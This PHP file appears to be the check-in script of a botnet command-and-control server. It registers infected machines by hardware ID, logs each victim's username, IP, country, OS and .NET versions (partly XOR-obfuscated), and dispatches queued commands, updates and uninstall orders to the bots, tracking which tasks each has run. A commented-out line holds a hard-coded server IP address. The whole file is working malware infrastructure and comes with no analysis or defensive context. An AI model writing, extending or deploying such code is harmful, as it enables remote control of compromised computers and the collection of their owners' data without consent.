<?php
require_once __DIR__ . '/config.php';
include 'src/Geo/geoip.inc';
$gi = geoip_open("src/Geo/GeoIP.dat", "");



function xor_this($data) {

    $key = "KCQ";

	$dataLen = strlen($data);
	$keyLen = strlen($key);
	$output = $data;

	for ($i = 0; $i < $dataLen; ++$i) {
		$output[$i] = $data[$i] ^ $key[$i % $keyLen];
	}

	return $output;
}





if(empty($_POST["hwid"])){
    //echo xor_this("http://35.204.135.202/request.php");
   // echo xor_this("#7%;y~dpdeqam`xvyscd14:6487;+!");
    die("404");
}



$ip = $_SERVER['HTTP_CLIENT_IP'] ? $_SERVER['HTTP_CLIENT_IP'] : ($_SERVER['HTTP_X_FORWARDED_FOR'] ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
$country = geoip_country_code_by_addr($gi, $ip);



// {0a2495a8-5af7-11e9-b637-806e6f6e6963}
//$_POST["hwid"] =  "{0a2495a8-5af7-11e9-b637-806e6f6e6963}";
$statement = $pdo->prepare("SELECT * FROM bots WHERE hwid = ?");
$statement->execute(array($_POST["hwid"]));   
$botfound = false;
$bot = "";
while($row = $statement->fetch()) {
    $botfound = true;
    $bot = $row;
}






if($botfound){


    $statement = $pdo->prepare("UPDATE bots SET lastresponse = CURRENT_TIMESTAMP() WHERE hwid = ?");
    $statement->execute(array($_POST["hwid"]));
    //

    if(isset($_POST["ps"]) && isset($_POST["id"])){
        //Executed Task 
        $statement = $pdo->prepare("UPDATE tasks_completed SET status = ? WHERE taskid = ? AND bothwid = ?"); // AND taskid = ? 
        $statement->execute(array($_POST["ps"], $_POST["id"], $_POST["hwid"]));
    }

    $cmds = $pdo->query("SELECT * FROM tasks ORDER BY id");
    while ($com = $cmds->fetch(PDO::FETCH_ASSOC))
    {
        if ($com['status'] == "1")
        {
            //$executions = $pdo->query("SELECT COUNT(*) FROM tasks_completed WHERE taskid = '".$com['id']."'")->fetchColumn(0);
            $ae = $pdo->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i AND bothwid = :h");
            $ae->execute(array(":i" => $com['id'], ":h" => $_POST["hwid"]));
            if ($ae->fetchColumn(0) == 0)
            {

                if($com["task"] == "uninstall"){
                    echo $com["task"];
                }elseif($com["task"] == "update"){
                    echo "update;".$com["id"].";".$com["command"];
                } else{
                    echo "newtask;".$com["id"].";".$com["command"];
                }
                //send taskID
              
                $statement = $pdo->prepare("INSERT INTO tasks_completed (bothwid, taskid, status) VALUES (?, ?, ?)");
                $statement->execute(array($_POST["hwid"], $com["id"], "send"));   
                //insert Send 
                // Get Executed or Failed
                break;
            }
        }
    }

}else{
    $statement = $pdo->prepare("INSERT INTO bots (hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
    $statement->execute(array($_POST["hwid"], xor_this($_POST["username"]), $country,  xor_this($_POST["nf2"]),  xor_this($_POST["nf3"]),  xor_this($_POST["nf35"]),  xor_this($_POST["nf4"]),$ip,  $_POST["os"],  xor_this($_POST["botversion"]))); 
}




?>